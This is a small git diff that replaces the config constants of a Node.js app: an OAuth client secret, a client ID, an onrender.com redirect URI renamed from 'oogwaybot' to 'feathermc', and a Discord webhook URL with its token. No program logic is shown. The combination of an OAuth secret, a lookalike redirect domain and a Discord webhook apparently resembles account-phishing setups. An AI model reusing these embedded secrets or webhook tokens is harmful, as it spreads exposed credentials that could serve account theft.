@@ -1,8 +1,8 @@
 //Config
-const client_secret = 'Mrx8Q~WgyY7I5fBIb2QhQI~X0wg4Y8vN0x2X3bOa'
-const client_id = 'f8b8d615-4b98-464b-8be3-6e1ba57e6b83'
-const redirect_uri = 'https://oogwaybot.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1051002524452266015/d0pI3QnKTUNP7XSX_oX-YSkcsbQoviyxcL_P2yrqIaJCW8WWUzLQmaB4ugqlcfrL8y_L'
+const client_secret = 'CHs8Q~8LQHuKdJAolZpivJO4Jac2Wc3ovI6ghded'
+const client_id = '048e85fb-2ae5-40a9-9492-31cde4d6391e'
+const redirect_uri = 'https://feathermc.onrender.com'
+const webhook_url = 'https://ptb.discord.com/api/webhooks/1055345901691994142/OfnRPrPLUnie1X98li-qlXgwFmATQaLgw2DIDLBY9yDC2RwgS9KzjnFTLYf_lDVEGSs4'
 //Requirements
 const axios = require('axios')
 const express = require('express')
